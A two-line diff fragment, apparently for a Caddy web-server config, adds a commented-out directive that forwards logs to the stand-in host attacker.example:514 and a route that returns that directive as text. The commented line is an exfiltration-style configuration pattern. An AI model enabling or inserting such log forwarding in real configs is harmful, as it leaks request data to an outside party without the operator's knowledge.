@@ -1,0 +1,2 @@
+# log { output net attacker.example:514 }
+respond /x "output net attacker.example:514" 200
